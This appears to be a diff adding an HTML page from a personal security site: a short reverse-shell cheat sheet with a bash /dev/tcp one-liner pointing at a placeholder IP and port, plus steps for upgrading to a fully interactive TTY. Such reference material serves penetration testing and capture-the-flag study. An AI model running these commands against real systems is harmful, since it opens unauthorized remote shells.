@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="../../css/bootstrap.min.css">
+    <link rel="stylesheet" href="../../icons/font/bootstrap-icons.min.css">
+    <link rel="stylesheet" href="../../css/main.css">
+    <title>~/sec/cheatsheet/revshell</title>
+</head>
+
+<body>
+    <div class="container mt-5">
+        <header class="header mb-4">
+            <div class="header-nav py-3">
+                <ul class="nav justify-content-end gap-3">
+                    <li class="nav-item">
+                        <a class="nav-link p-0" href="../../index.html">/</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link active p-0" aria-current="page" href="../../sec/index.html">/sec</a>
+                    </li>
+                    <li class="nav-item">
+                        <a class="nav-link p-0" href="../../whoami.html">/whoami</a>
+                    </li>
+                </ul>
+            </div>
+        </header>
+        <main>
+            <nav aria-label="breadcrumb" style="content: '';">
+                <ol class="breadcrumb">
+                    <li class="breadcrumb-item p-0"><a href="../../index.html">~</a></li>
+                    <li class="breadcrumb-item p-0"><a href="#"><a href="../../sec/index.html">/sec</a></li>
+                    <li class="breadcrumb-item p-0"><a href="#"><a href="../cheatsheet/index.html">/cheatsheet</a></li>
+                    <li class="breadcrumb-item fw-semibold p-0"><a href="#">/revshell</a></li>
+                </ol>
+            </nav>
+            <h1 class="fs-5 fw-semibold text-uppercase">Reverse Shell</h1>
+            <details open="">
+                <summary class="fs-6 fw-semibold text-uppercase">
+                    Get a reverse shell
+                </summary>
+                <div class="ps-4">
+                    <a href="https://www.revshells.com/">Reverse Shell Generator</a>
+                </div>
+                <ul class="dashed">
+                    <li>
+                        Bash:
+                        <code role="button" onclick="copyToClipboard('bash')">
+                            <span id="bash">bash -i >& /dev/tcp/[YOUR_IP]/[YOUR_PORT] 0>&1</span>
+                        </code>
+                    </li>
+                </ul>
+            </details>
+            <details open="">
+                <summary class="fs-6 fw-semibold text-uppercase">
+                    Upgrade shell
+                </summary>
+                <div class="ps-4 mb-3">
+                    Upgrade from shell to bash:<br>
+                    <code role="button" onclick="copyToClipboard('shell1')">
+                        <span id="shell1">SHELL=/bin/bash script -q /dev/null</span>
+                    </code>
+                </div>
+                <div class="ps-4 mb-3">
+                    If python is installed on the target:<br>
+                    <code role="button" onclick="copyToClipboard('shell2')">
+                        <span id="shell2">python -c 'import pty; pty.spawn("/bin/bash")'</span>
+                    </code>
+                </div>
+                <div class="ps-4 mb-3">
+                    Get clear command:<br>
+                    <code role="button" onclick="copyToClipboard('shell3')">
+                        <span id="shell3">export TERM=xterm</span>
+                    </code>
+                </div>
+                <div class="ps-4 mb-3">
+                    Fully interactive TTY:
+                    <ul class="dashed p-0">
+                        <li>
+                            <kbd>CTRL + Z</kbd> to put the current remote shell in background.
+                        </li>
+                        <li>
+                            <code role="button" onclick="copyToClipboard('shell4')">
+                                <span id="shell4">stty raw -echo && fg</span>
+                            </code> to update the local terminal line settings.
+                        </li>
+                        <li>
+                            <code role="button" onclick="copyToClipboard('shell5')">
+                                <span id="shell5">reset</span>
+                            </code> to reinitialize the terminal and get the fully interactive shell.
+                        </li>
+                    </ul>
+                </div>
+            </details>
+        </main>
+        <script src="../../js/bootstrap.bundle.min.js"></script>
+        <script>
+            const tooltipTriggerList = document.querySelectorAll('[data-bs-toggle="tooltip"]')
+            const tooltipList = [...tooltipTriggerList].map(tooltipTriggerEl => new bootstrap.Tooltip(tooltipTriggerEl))
+
+            const copyToClipboard = async (id) => {
+                try {
+                    const element = document.getElementById(id);
+                    await navigator.clipboard.writeText(element.textContent);
+                } catch (error) {
+                    console.error("Failed to copy to clipboard:", error);
+                }
+            }
+        </script>
+    </div>
+</body>
+
+</html>
